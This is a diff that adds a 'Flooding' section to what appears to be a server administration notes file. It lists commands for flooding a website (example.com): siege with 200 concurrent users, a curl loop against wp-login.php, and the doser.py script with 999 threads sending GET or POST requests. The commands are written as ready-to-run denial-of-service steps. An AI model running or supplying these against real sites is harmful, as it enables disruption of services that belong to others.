@@ -427,3 +427,14 @@ service clamav-daemon restart
 ##################################
 ?
 ?
+
+######### Flooding with SIEGE #########
+apt-get install siege
+siege -c 200 -b -t30s 'https://example.com'
+######### Flooding with CURL #########
+curl -s 'https://example.com/wp-login.php?[1-100]'
+######### Flooding with DOSER ######### https://github.com/Quitten/doser.py
+# command 999 threads sends GET requests:
+python doser.py -t 999 -g 'https://example.com'
+# command 999 threads sends POST requests with json data:
+python doser.py -t 999 -p 'https://example.com' -ah 'Content-Type: application/json' -d '{"json": "payload"}'
